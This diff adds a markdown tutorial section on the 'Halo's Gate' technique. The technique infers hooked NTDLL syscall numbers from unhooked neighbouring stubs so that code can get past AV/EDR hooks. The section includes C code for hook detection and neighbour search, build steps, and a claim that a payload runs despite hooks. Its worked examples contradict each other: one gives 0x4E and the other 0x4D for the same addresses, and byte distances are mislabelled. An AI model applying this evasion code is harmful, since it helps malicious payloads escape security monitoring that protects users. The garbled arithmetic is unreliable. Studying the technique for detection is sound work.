@@ -1199,7 +1199,333 @@ The technique remains valuable for educational purposes and demonstrates importa
 
 </details>
 
-</details>
 
+
+</details>
+<summary>05 - Hooks vs Halo Gate</summary>
+
+## Overview
+
+Halo's Gate is an enhancement to the Hell's Gate technique that enables dynamic syscall resolution even when NTDLL functions are hooked by AV/EDR solutions. This method bypasses API hooks without requiring a fresh copy of NTDLL from disk by leveraging the linear and ordered nature of syscall numbers in memory.
+
+## The Problem: Hooks vs Hell's Gate
+
+While Hell's Gate works effectively against unhooked NTDLL, it fails when security solutions hook functions because the characteristic syscall stub pattern (`4C 8B D1 B8`) is replaced with detour jumps. Halo's Gate addresses this limitation by exploiting the observation that not all syscalls are hooked and their numbers follow a predictable, linear order in memory.
+
+<img width="404" height="286" alt="image" src="https://github.com/user-attachments/assets/b9ae0a8b-bc84-49bd-a837-9dd311f31540" />
+
+## Core Concept: Linear Syscall Ordering
+
+### The Key Insight
+
+System calls in NTDLL are arranged in linear, sequential order in memory. When a specific syscall is hooked, we can examine its neighbors to find clean (unhooked) syscalls and mathematically derive the original syscall number.
+
+**Example Analysis:**
+```
+Address        Function              Status    Syscall
+0x7FFC04A31250 NtCreateThreadEx     HOOKED    ???
+0x7FFC04A31270 NtCreateProcessEx    HOOKED    ???
+0x7FFC04A31290 NtIsProcessInJob     CLEAN     0x4F
+0x7FFC04A312B0 NtProtectVirtualMem  CLEAN     0x50
+```
+
+If we find that `NtIsProcessInJob` at offset +32 bytes has syscall number `0x4F`, and we know the hooked `NtCreateThreadEx` is 32 bytes before it, we can calculate:
+- `NtCreateThreadEx` syscall = `0x4F - 1 = 0x4E`
+
+### Mathematical Foundation
+
+The technique relies on two facts:
+1. **Linear Ordering**: Syscall numbers increase sequentially in memory
+2. **Fixed Stub Size**: Each syscall stub occupies exactly 32 bytes on 64-bit Windows 10
+
+## Implementation Architecture
+
+### Modified Resolution Algorithm
+
+Halo's Gate modifies the `get_vx_table_entry` function from Hell's Gate with a sophisticated neighbor-search algorithm:
+
+```c
+BOOL GetVxTableEntry(PVOID pDllBase, PIMAGE_EXPORT_DIRECTORY pExportDir, PVX_TABLE_ENTRY pVxEntry) {
+    // ... Hell's Gate resolution code ...
+    
+    // If function is hooked, search neighbors
+    if (IsFunctionHooked(pVxEntry->pAddress)) {
+        return FindSyscallViaNeighbors(pVxEntry);
+    }
+    
+    return TRUE;
+}
+```
+
+### Neighbor Search Implementation
+
+The core algorithm searches in an expanding spiral pattern:
+
+```c
+BOOL FindSyscallViaNeighbors(PVX_TABLE_ENTRY pVxEntry) {
+    for (INT i = 1; i < MAX_SEARCH_DISTANCE; i++) {
+        // Search downward (higher addresses)
+        PVOID pNeighbor = (PBYTE)pVxEntry->pAddress + (i * SYSCALL_STUB_SIZE);
+        if (IsCleanSyscallStub(pNeighbor)) {
+            pVxEntry->wSystemCall = GetSyscallNumber(pNeighbor) - i;
+            return TRUE;
+        }
+        
+        // Search upward (lower addresses)  
+        pNeighbor = (PBYTE)pVxEntry->pAddress - (i * SYSCALL_STUB_SIZE);
+        if (IsCleanSyscallStub(pNeighbor)) {
+            pVxEntry->wSystemCall = GetSyscallNumber(pNeighbor) + i;
+            return TRUE;
+        }
+    }
+    
+    return FALSE;
+}
+```
+
+## Step-by-Step Technical Process
+
+### Step 1: Initial Hell's Gate Resolution
+
+The process begins identically to Hell's Gate:
+
+1. **Locate NTDLL** via Process Environment Block (PEB)
+2. **Parse Export Directory** to find target function addresses
+3. **Hash Function Names** using DJB2 algorithm
+4. **Extract Function Addresses** from export table
+
+### Step 2: Hook Detection
+
+When examining the target function:
+
+```c
+BOOL IsFunctionHooked(PVOID pFunction) {
+    PBYTE pBytes = (PBYTE)pFunction;
+    
+    // Check for jump instruction (0xE9) indicating hook
+    if (pBytes[0] == 0xE9) {
+        return TRUE;
+    }
+    
+    // Check if syscall stub pattern is intact
+    if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1 && 
+        pBytes[3] == 0xB8) {
+        return FALSE;  // Clean stub
+    }
+    
+    return TRUE;  // Hooked or modified
+}
+```
+
+### Step 3: Spiral Neighbor Search
+
+When a hook is detected, the algorithm searches neighbors in expanding distances:
+
+**Search Pattern:**
+```
+Distance 1: Target + 32 bytes, Target - 32 bytes
+Distance 2: Target + 64 bytes, Target - 64 bytes  
+Distance 3: Target + 96 bytes, Target - 96 bytes
+... up to maximum search distance
+```
+
+**Key Constants:**
+- `SYSCALL_STUB_SIZE = 32` (bytes for 64-bit Windows 10)
+- `MAX_SEARCH_DISTANCE = 10` (configurable based on requirements)
+
+### Step 4: Syscall Number Calculation
+
+Once a clean neighbor is found:
+
+- **For downward search**: `target_syscall = neighbor_syscall - distance`
+- **For upward search**: `target_syscall = neighbor_syscall + distance`
+
+**Example:**
+- Hooked function at address `0x7FFC04A31250`
+- Clean neighbor found at `0x7FFC04A31290` (distance = 2)
+- Neighbor syscall number = `0x4F`
+- Calculated target syscall = `0x4F - 2 = 0x4D`
+
+## Code Implementation
+
+### Modified GetVxTableEntry Function
+
+```c
+BOOL GetVxTableEntry(PVOID pDllBase, PIMAGE_EXPORT_DIRECTORY pExportDir, PVX_TABLE_ENTRY pVxEntry) {
+    PDWORD pAddressOfFunctions = (PDWORD)((PBYTE)pDllBase + pExportDir->AddressOfFunctions);
+    PDWORD pAddressOfNames = (PDWORD)((PBYTE)pDllBase + pExportDir->AddressOfNames);
+    PWORD pAddressOfNameOrdinals = (PWORD)((PBYTE)pDllBase + pExportDir->AddressOfNameOrdinals);
+    
+    // Find function by hash (same as Hell's Gate)
+    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
+        const char* pFunctionName = (const char*)pDllBase + pAddressOfNames[i];
+        DWORD64 functionHash = HashStringDjb2(pFunctionName);
+        
+        if (functionHash == pVxEntry->dwHash) {
+            pVxEntry->pAddress = (PVOID)((PBYTE)pDllBase + 
+                                       pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            
+            // Halo's Gate modification: Handle hooks
+            if (!ExtractSyscallNumber(pVxEntry->pAddress, &pVxEntry->wSystemCall)) {
+                // If direct extraction fails, search neighbors
+                if (!FindSyscallViaNeighbors(pVxEntry)) {
+                    return FALSE;  // Could not resolve syscall
+                }
+            }
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+```
+
+### Neighbor Search Implementation
+
+```c
+BOOL FindSyscallViaNeighbors(PVX_TABLE_ENTRY pVxEntry) {
+    CONST INT SYSCALL_STUB_SIZE = 32;  // 64-bit Windows 10
+    CONST INT MAX_SEARCH_DISTANCE = 10;
+    
+    for (INT i = 1; i <= MAX_SEARCH_DISTANCE; i++) {
+        // Search downward (higher memory addresses)
+        PVOID pDownNeighbor = (PBYTE)pVxEntry->pAddress + (i * SYSCALL_STUB_SIZE);
+        WORD wNeighborSyscall;
+        
+        if (ExtractSyscallNumber(pDownNeighbor, &wNeighborSyscall)) {
+            pVxEntry->wSystemCall = wNeighborSyscall - i;
+            return TRUE;
+        }
+        
+        // Search upward (lower memory addresses)
+        PVOID pUpNeighbor = (PBYTE)pVxEntry->pAddress - (i * SYSCALL_STUB_SIZE);
+        if (ExtractSyscallNumber(pUpNeighbor, &wNeighborSyscall)) {
+            pVxEntry->wSystemCall = wNeighborSyscall + i;
+            return TRUE;
+        }
+    }
+    
+    return FALSE;  // No clean neighbor found within search radius
+}
+```
+
+## Practical Demonstration
+
+### Testing Environment Setup
+
+1. **Compile Halo's Gate**:
+```batch
+cd 04.HalosGate
+msbuild HalosGate.sln /t:Rebuild /p:Configuration=Release /p:Platform="x64"
+```
+
+2. **Verify Hooks Exist**:
+- Attach debugger to process
+- Examine `NtCreateThreadEx` in NTDLL
+- Confirm hook is present (starting with `E9` jump instruction)
+
+### Debugger Analysis
+
+#### Hook Verification
+<img width="1609" height="802" alt="Hooked NtCreateThreadEx" src="https://github.com/user-attachments/assets/a0b543fb-c0c1-49df-8965-5c807fd5fed1" />
+
+**Observation:**
+- `NtCreateThreadEx` starts with `E9` (jump instruction)
+- Characteristic syscall bytes (`4C 8B D1 B8`) are replaced
+- This would cause Hell's Gate to fail
+
+#### Neighbor Examination
+<img width="1612" height="807" alt="Clean neighbor syscalls" src="https://github.com/user-attachments/assets/a30d4015-2a22-42b8-85cc-e7b6685a9b8e" />
+
+**Finding Clean Neighbors:**
+- Move 32 bytes up/down from hooked function
+- Locate syscalls with intact stub patterns
+- Extract their syscall numbers
+- Calculate target syscall via offset
+
+### Execution Results
+
+**Before Halo's Gate:**
+- Hell's Gate fails when NTDLL is hooked
+- Program cannot resolve syscall numbers
+- Execution terminates early
+
+**After Halo's Gate:**
+- Successfully resolves syscalls despite hooks
+- All four target functions work correctly
+- Payload executes as intended
+
+```batch
+# Run Halo's Gate executable
+HalosGate.exe
+# Program executes successfully despite hooks
+```
+
+## Technical Considerations
+
+### Platform Specifics
+
+**Stub Sizes:**
+- 64-bit Windows 10: 32 bytes per syscall stub
+- 32-bit Windows: 16 bytes per syscall stub
+- Other Windows versions may vary
+
+**Search Parameters:**
+- `MAX_SEARCH_DISTANCE = 10` balances reliability and performance
+- Larger values increase reliability but may hit invalid memory
+- Smaller values may miss the nearest clean neighbor
+
+### Limitations and Edge Cases
+
+1. **Massive Hook Deployment**: If all nearby syscalls are hooked, resolution fails
+2. **Non-linear Syscall Layout**: Theoretical edge case if syscalls aren't sequential
+3. **Stub Size Variations**: Different Windows versions may have different stub sizes
+4. **Memory Protection**: Some syscall regions may have execute-only protection
+
+### Detection Considerations
+
+While Halo's Gate bypasses API hooks, advanced EDR solutions may detect it through:
+
+1. **Behavioral Analysis**: Unusual memory scanning patterns
+2. **Syscall Sequence Detection**: Direct syscall usage from non-system modules
+3. **Timing Analysis**: Neighbor search introduces measurable delays
+4. **Memory Access Patterns**: Scanning NTDLL memory regions
+
+## Comparison with Hell's Gate
+
+| Aspect | Hell's Gate | Halo's Gate |
+|--------|-------------|-------------|
+| Hook Bypass | No | Yes |
+| NTDLL Source | In-memory only | In-memory only |
+| Resolution Method | Direct pattern scan | Neighbor inference |
+| Compatibility | Unhooked NTDLL only | Hooked & unhooked NTDLL |
+| Complexity | Simple | Moderate |
+| Reliability | High (no hooks) | High (with hooks) |
+
+## Security Implications
+
+### Defensive Applications
+- Red team operations against hooked environments
+- Security product testing and evaluation
+- Malware analysis and research
+- Educational purposes for Windows internals
+
+### Detection Mitigations
+- Monitor for NTDLL memory scanning
+- Detect spiral search patterns in syscall regions
+- Analyze syscall invocation sources
+- Implement behavioral detection for neighbor inference
+
+## Conclusion
+
+Halo's Gate represents a significant evolution in syscall resolution techniques by addressing the primary limitation of Hell's Gate. By leveraging the linear ordering of syscalls in memory, it can infer correct syscall numbers even when target functions are hooked, maintaining the benefits of direct syscall invocation while expanding compatibility to hooked environments.
+
+The technique demonstrates sophisticated understanding of Windows internals and provides a robust method for security researchers and red teams to operate in monitored environments without relying on disk-based NTDLL copies or complex version-specific hardcoding.
+
+## References
+
+- Original Hell's Gate Technique
+- Windows System Call Table Documentation
+- PE File Format Specification
+- Windows Internals, 7th Edition
 
 </details>
